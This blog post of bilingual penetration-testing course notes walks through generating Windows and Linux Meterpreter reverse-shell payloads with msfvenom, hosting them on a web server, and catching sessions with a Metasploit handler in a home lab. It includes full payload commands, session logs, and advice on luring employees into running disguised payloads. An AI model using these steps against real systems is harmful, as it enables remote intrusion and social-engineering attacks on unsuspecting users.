---
layout: post
title: "Generating Payloads With Msfvenom"
date: "2023-01-14"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# Generating Payloads With Msfvenom
## Client-side Attacks
A client-side attack is an attack vector that involves coercing a client to execute a malicious payload on their system that consequently connects back to the attacker when executed.

Client-side attacks typically utilize various social engineering techniques like generating malicious documents or portable executables (PEs).

Client-side attacks take advantage of human vulnerabilities as opposed to vulnerabilities in services or software running on the target system.

Given that this attack vector involves the transfer and storage of a malicious payload on the client's system (disk), attackers need to be cognizant of AV detection.

# 使用 Msfvenom 生成有效负载
## 客户端攻击
客户端攻击是一种攻击媒介，涉及强制客户端在其系统上执行恶意负载，从而在执行时连接回攻击者。

客户端攻击通常利用各种社会工程技术，例如生成恶意文档或可移植可执行文件 (PEs)。

客户端攻击利用的是人为漏洞，而不是目标系统上运行的服务或软件中的漏洞。

鉴于此攻击向量涉及在客户端系统（磁盘）上传输和存储恶意负载，攻击者需要了解 AV 检测。

## Msfvenom
Msfvenom is a command line utility that can be used to generate and encode MSF payloads for various operating systems as well as web servers.

Msfvenom is a combination of two utilities, namely; msfpayload and msfencode.

We can use Msfvenom to generate a malicious meterpreter payload that can be transferred to a client target system. Once executed, it will connect back to our payload handler and provide us with remote access to the target system.

## Msfvenom
Msfvenom 是一个命令行实用程序，可用于为各种操作系统和 Web 服务器生成和编码 MSF 有效负载。

Msfvenom 是两个实用程序的组合，即； msfpayload 和 msfencode。

我们可以使用 Msfvenom 生成可以传输到客户端目标系统的恶意 meterpreter 负载。 一旦执行，它将连接回我们的有效负载处理程序，并为我们提供对目标系统的远程访问。

# Demo: Generating Payloads With Msfvenom（演示：使用 Msfvenom 生成有效负载）
Depending on the way the target operating system or the target system has been configured, you'll need to structure or coordinate your attack accordingly. 

I'll give you an example here. If the target system that you're trying to attack or you're trying to gain access to has been configured as a server, for example, it's running Windows Server, and it's used to host business-critical applications or web server, for example, then our attack vector would be a host-based attack or a service-based attack, whereby we will be trying to find vulnerabilities within the services that are running on that system. Now, if the target system that you're trying to attack has been configured to run as an end-user operating system, so let's say you're trying to target an employee laptop or an employee workstation, then you'll need to change your attack vector to a client-side attack, where your job will be to, first and foremost, generate a malicious payload either for Windows or Linux. And then secondly, you can utilize social engineering techniques like, generating malicious documents or making the payloads look as enticing as possible so that you are trying to convince the client or the target employee, in this case, to actually click on that payload. So this is where social engineering comes into play. 

A simple example or a scenario would be that we generate a Windows payload with msfvenom. Once we have generated the payload, we can then inject the payload into another legitimate Windows executable, therefore, making it look legitimate. And then we can distribute this to the client or the target employee either through email or maybe through another type of communication channel. And once it's on their system, they will click on it and consequently execute the payload. Now when they execute the payload, we need to be ready with a handler or a listener rather that will essentially receive the incoming connection. And once they execute it on their target system and once we have the listener set up, we should be able to receive the connection back from the target system, and consequently, gain access to the target system.

Because we're trying to send a payload or trying to get a target employee or individual to download a malicious payload and then execute it on their system, we need to be aware of the fact that their system could have antivirus solution installed that could consequently detect or find that this particular payload is malicious and prevent the target individual from executing it. So we'll also be exploring the process of encoding payloads with msfvenom. And then finally, to wrap up this section, we'll be exploring the process of generating or injecting our payloads into a legitimate executable to make it look as enticing as possible.

Kali: 10.10.10.5
Windows 7: 10.10.10.7

```
msfvenom
```

During the earlier section or the introduction section of this course, I briefly explained the two types of MSF modules available. One of which was a staged payload, where the payload would essentially be sent into parts. And then you have the non-staged or inline payloads, where the payload is essentially sent along with the exploit as a whole. And with msfvenom, you can generate both of these types of payloads. 

List out the available payloads you can generate with the msfvenom. 

```
msfvenom --list payloads
```

The meterpreter payload also allows you to specify the target architecture of the target operating system.

You can generate a 64-bit payload.

```
windows/x64/meterpreter/reverse_tcp
```

This is a standard 32-bit payload.

```
windows/meterpreter/bind_tcp
```

And msfvenom allows you to specify the target operating system architecture when generating a payload.

Let's explore or understand the difference between a staged payload and a non-staged payload in the context of how they differ in terms of their name because when generating a payload, you need to specify the exact type of payload that you want to generate.

Whenever you're specifying a payload, you start off by specifying the operating system with which, in this case, is Windows. And then you specify the target operating system architecture or the actual architecture, or rather the type of payload you're trying to generate in regards to the target operating system architecture. So if I generate a 64-bit payload, I cannot run the payload on my 32-bit operating system. So you need to be very cognizant of that. And then, after that, we specify the payload type. In this case, this is a meterpreter payload. And then after this you specify the protocol that you want to use to actually connect back to the attacker operating system. This will depend on your own use case and the target environment that you are going to be deploying your payloads on. So a good example of this is whenever you're trying to utilize the reverse HTTP or HTTPS payload. This is very good if you are trying to mask the connection as legitimate because, remember, this is a reverse connection, which means, once this payload is executed on the target system, it will connect back to the attacker system. And in this case, it will go through an HTTP or an HTTPS port, which will help mask the activity as a connection to another port on an attacker system will be extremely suspicious. So that's in the context of TCP. So the type of protocol we will use will depend on what your requirements are.

```
windows/x64/meterpreter/reverse_http
windows/x64/meterpreter/reverse_https
windows/x64/meterpreter/reverse_tcp
```

This is a staged payload. And the way you can tell the difference is because you're specifying meterpreter, and then there's a forward slash, and then you specify the protocol that you want to use. 

```
windows/x64/meterpreter/reverse_http
```

An example of a non-staged payload is one here. This is where you specify the operating system, the operating system architecture, and then you specify the meterpreter. However, instead of there being a forward slash, you can see that _reverse_http. So this is a non-staged payload.

```
windows/x64/meterpreter_reverse_http
```

This is a 32-bit meterpreter payload. And this is a staged payload.

```
linux/x86/meterpreter/bind_tcp
```

That's a staged payload.

```
linux/x64/meterpreter/reverse_tcp
```

This is the non-staged payload.

```
linux/x64/meterpreter_reverse_https
```

Whenever you're trying to generate a payload with msfvenom, you type in `msfvenom`.

`-a`: specify the target architecture. This is not always required, but it is quite useful. So if I want to generate a 32-bit payload, I can type in `x86`.

`-p`: specify the payload. So if I want to generate a Windows payload, then I can specify the target architecture. But in this case, it's a 32-bit payload. 

`LHOST=`: specify the attacker's information. What IP address will this payload connect to. 

`LPORT=`: And in the case of TCP, we can specify the actual port to connect back to, or rather the port that the payload will connect back to.

Now, this is where the important part comes into play, and that is the output format. So we can generate this payload or essentially output, or generate this payload and output it into an exe file, so that it can directly be executed on the target system. In order to do this, we specify the format option `-f`.

It's very important that you specify the extension here.

```
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/Windows_Payloads/payloadx86.exe
```

```
cd Desktop/Windows_Payloads/
ls
```

So you can now transfer this over to the target system, or you can essentially set this up in a social engineering campaign and somehow get the target employee or the person you're targeting to download it and then execute it on this system. However, before they execute it, you need to set up a handler. And before we actually get into how to set up a handler, let's take a look at how to generate another type of payload or rather changing the actual architecture of the payload that we're generating.

To generate a 64-bit meterpreter payload, and we're going to change the architecture to `x64`. And then, as well as in the payload, we are also going to say this is an `x64` meterpreter payload. And we're going to output it into the exe format. So it's really that simple in regards to, changing the architecture.

It gets the actual platform from the actual module or the payload that we specified.

```
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/Windows_Payloads/payloadx64.exe
```

You can see that we have the payloadx64.exe, which is suitable for 64-bit versions of Windows. And the 32-bit payload can be executed on both 32-bit versions of Windows as well as 64-bit versions of Windows.

```
ls
```

You can list out the output formats available. That will provide you with a list of formats that you can output your payloads into.

```
msfvenom --list formats
```

And they are sorted based on executable format.

These are the formats that can be directly executed, and they are sorted based on the target operating system or platform.

If you want an executable file, you can output it into asp, aspx, aspx-exe, dll file for Windows. If you're trying to generate a malicious Linux binary, you can use the elf option. If you are trying to generate a malicious Linux shared object file, you can use the elf shared object option `elf-so`. If you are trying to generate a Windows executable, you can say exe, or exe-only, exe-service, exe-small, etc. You have your other options here for Java or Java web servers. So you have your jar file, jsp file. You can also generate msi files for Windows as well as OSX or Mac OSX app files for execution on MacOS targets.

```
asp
aspx
aspx-exe
dll
elf
elf-so
exe
exe-only
exe-service
exe-small
jar
jsp
msi
msi-nouac
osx-app
```

You have the Framework Transform Formats, which allow you to output the payloads into either a Python file, a Ruby file that can then be modified later, or even a hex file if you want.

```
hex
python
ruby
```

How to generate Linux payloads.

So whenever you are generating a Linux payload, you have the ability to output it into a binary file or an ELF file, which can both be executed immediately. 

And then you can specify the architecture if you want. Although, that's not required because you're going to be specifying the architecture within the actual payload type. So if I'm generating a 32-bit Linux payload. And then I specify the actual type of payload, which is meterpreter. And then I can specify the protocol to use which, in this case, is going to be a reverse TCP connection. And then the LHOST option, this is where you specify the attacker's IP address or the IP that you want the payload to connect back to. And then you specify the port to connect back to. And then you specify the output format as ELF because we're outputting this into an extensible linking format for Linux. And you can then provide it with the ELF extension, or you can output it directly into a binary. I'm not going to provide any extension because the binary can directly be executed.

That is going to generate a staged Linux 32-bit meterpreter payload. It gets the actual architecture from the payload if we don't specify it explicitly. And it also gets the platform from the payload. So the most important thing that you'll need to specify whenever generating a malicious payload is the actual payload type.

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > ~/Desktop/Linux_Payloads/payloadx86
```

```
cd Linux_Payloads/
ls
chmod +x payloadx86
./payloadx86
```

Generating a 64-bit Linux payload.

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > ~/Desktop/Linux_Payloads/payloadx64
```

Now, in terms of transferring them onto the target, that is going to depend on the type of social engineering technique that you will utilize.

In my case, we are going to transfer the Windows payload first to a Windows 7 system. 

So, in order to transfer this Windows payloads onto the target Windows 7 system. I'm going to navigate into the Windows payloads directory, and I'm going to set up a simple web server within this folder to server these two payload files. And then I'll head over onto Windows 7 system and then download the payloads from Kali Linux web server that I'll set up. 

```
cd Windows_Payloads/
ls
```

So, in order to set up a simple web server to host these files. We're using a Python module called SimpleHTTPServer. And I'll host this on port 80.

I will be able to access all of these files on the Kali Linux IP on port 80.

```
sudo python -m SimpleHTTPServer 80
```

However, we also need to set up the handler to receive the reverse connection back from the target system.

Now, the reason we're utilizing the Metasploit `exploit/multi/handler` is because whenever we're dealing with payloads that are advanced like a meterpreter payload, we need an appropriate listener to actually handle the reverse connection or the connection that we receive from the target system.

And once we specify the `multi/handler`, it's going to say using the configured payload. We need to change that because we need to set up a listener for the meterpreter payload. And in this case, the payload that we're going to be using first or that we are going to be awaiting connection back from, is the Windows x86 payload that we generated.

So this is where you would specify the actual payload option that you had used to generate your payload with msfvenom.

```
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
```

I now need to set the LHOST option or the IP address that we configured our msfvenom payload to connect back. And then set the LPORT that we had also configured with msfvenom when generating our Windows payload.

``` 
show options
set LHOST 10.10.10.5
set LPORT 1234
run
```

So now, it's listening for a connection from the target system whenever the payload is executed. 

So I'm just going to switch over to the Windows 7 system.

So I'll download payload x86 because we set up the multi/handler for that particular payload type.

```
http://10.10.10.5/
```

We can execute it. And we should receive a reverse connection on our handler now.

I received a meterpreter session from the target system. And we now have access on the target system. And this is what a client-side attack looks like.

```
meterpreter > sysinfo
meterpreter > exit
```

Now, we haven't explored the process of antivirus evasion and, more specifically, encoding our payloads.

And you can repeat this process for the Linux payload.

```
set payload linux/x86/meterpreter/reverse_tcp
run
```

```
cd ..
ls
cd Linux_Payloads/
ls
./payloadx86
```

We get a meterpreter session.

That's how to generate payloads with msfvenom for both Linux and Windows. 

Next, we'll be exploring the process of encoding these payloads to avoid antivirus detection. And then, after that, we'll also be exploring the process of how to inject a payload into a legitimate Windows executable, which can also help with the legitimacy aspect of things to trying to make the actual executable or the payload look as realistic as possible, and avoid any detection in terms of suspicion from the end-user.

That was the process of generating Windows and Linux payloads with msfvenom, as well as utilizing or setting up a handler in order to receive the connection.

# Home Lab
Kali: 192.168.248.148

Windows 7 SP1: 192.168.248.150

[MSFVENOM](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

```
错误：MsfVenom - Metasploit 独立有效负载生成器。
也是 msfpayload 和 msfencode 的替代品。
用法：/usr/bin/msfvenom [选项]

选项：
     -p, --payload 要使用的负载。 指定“-”或标准输入以使用自定义负载
         --payload-options 列出有效负载的标准选项
     -l, --list [type] 列出模块类型。 选项有：payloads, encoders, nops, all
     -n, --nopsled 将 [长度] 大小的 nopsled 添加到有效负载上
     -f, --format 输出格式（使用 --help-formats 列表）
         --help-formats 列出可用格式
     -e, --encoder 使用的编码器
     -a, --arch 要使用的架构
         --platform 有效载荷的平台
         --help-platforms 列出可用平台
     -s, --space 生成的有效负载的最大大小
         --encoder-space 编码有效负载的最大大小（默认为 -s 值）
     -b, --bad-chars 要避免的字符列表例如：'\x00\xff'
     -i, --iterations 对有效载荷进行编码的次数
     -c, --add-code 指定要包含的附加 win32 shellcode 文件
     -x, --template 指定一个自定义的可执行文件作为模板
     -k, --keep 保留模板行为并将有效负载作为新线程注入
     -o, --out 保存负载
     -v, --var-name 指定用于特定输出格式的自定义变量名
         --smallest 生成尽可能小的有效载荷
     -h, --help 显示这条消息
```

```
msfvenom --list payloads
```

```
Framework Payloads (951 total) [--payload <value>]
==================================================
windows/x64/meterpreter/reverse_http                               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newe
                                                                       r. Tunnel communication over HTTP (Windows x64 wininet)
windows/x64/meterpreter/reverse_https                              Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newe
                                                                       r. Tunnel communication over HTTP (Windows x64 wininet)
windows/x64/meterpreter/reverse_tcp                                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newe
                                                                       r. Connect back to the attacker (Windows x64)
```

```
windows/meterpreter/bind_tcp                                       Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newe
                                                                       r. Listen for a connection (Windows x86)

```

```
    windows/x64/meterpreter_reverse_http                               Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.
    windows/x64/meterpreter_reverse_https                              Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.
    windows/x64/meterpreter_reverse_tcp                                Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.
```

```
   linux/x86/meterpreter/bind_tcp                                     Inject the mettle server payload (staged). Listen for a connection (Linux x86)
    linux/x64/meterpreter/reverse_tcp                                  Inject the mettle server payload (staged). Connect back to the attacker
    linux/x64/meterpreter_reverse_https                                Run the Meterpreter / Mettle server payload (stageless)
```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.248.148 LPORT=1234 -f exe > payloadx86.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.248.148 LPORT=1234 -f exe > payloadx64.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# msfvenom --list formats                                                                                        

Framework Executable Formats [--format <value>]
===============================================

    Name
    ----
    asp
    aspx
    aspx-exe
    axis2
    dll
    elf
    elf-so
    exe
    exe-only
    exe-service
    exe-small
    hta-psh
    jar
    jsp
    loop-vbs
    macho
    msi
    msi-nouac
    osx-app
    psh
    psh-cmd
    psh-net
    psh-reflection
    python-reflection
    vba
    vba-exe
    vba-psh
    vbs
    war

Framework Transform Formats [--format <value>]
==============================================

    Name
    ----
    base32
    base64
    bash
    c
    csharp
    dw
    dword
    go
    golang
    hex
    java
    js_be
    js_le
    nim
    nimlang
    num
    perl
    pl
    powershell
    ps1
    py
    python
    raw
    rb
    ruby
    rust
    rustlang
    sh
    vbapplication
    vbscript

```

```
┌──(root㉿kali)-[~/payloads/Linux_Payloads]
└─# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.248.148 LPORT=1234 -f elf > payloadx86   
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes

```

```
┌──(root㉿kali)-[~/payloads/Linux_Payloads]
└─# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.248.148 LPORT=1234 -f elf > payloadx64   
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# ls
payloadx64.exe  payloadx86.exe
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# python2 -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

```
┌──(root㉿kali)-[~]
└─# msfconsole -q                                                                                        
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

```
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set LHOST 192.168.248.148
LHOST => 192.168.248.148
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.248.148:1234
```

```
http://192.168.248.148/
```

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.248.148:1234 
[*] Sending stage (175686 bytes) to 192.168.248.150
[*] Meterpreter session 1 opened (192.168.248.148:1234 -> 192.168.248.150:49192) at 2023-01-14 03:37:09 -0500

meterpreter > sysinfo
Computer        : IEWIN7
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.248.150 - Meterpreter session 1 closed.  Reason: User exit

```

```
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.248.148:1234 
```

```
┌──(root㉿kali)-[~/payloads/Linux_Payloads]
└─# ls                            
payloadx64  payloadx86
                                 
┌──(root㉿kali)-[~/payloads/Linux_Payloads]
└─# ./payloadx86 
```

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.248.148:1234 
[*] Sending stage (1017704 bytes) to 192.168.248.148
[*] Meterpreter session 2 opened (192.168.248.148:1234 -> 192.168.248.148:46860) at 2023-01-14 03:40:29 -0500

meterpreter > sysinfo
Computer     : 192.168.248.148
OS           : Debian  (Linux 5.18.0-kali2-amd64)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```

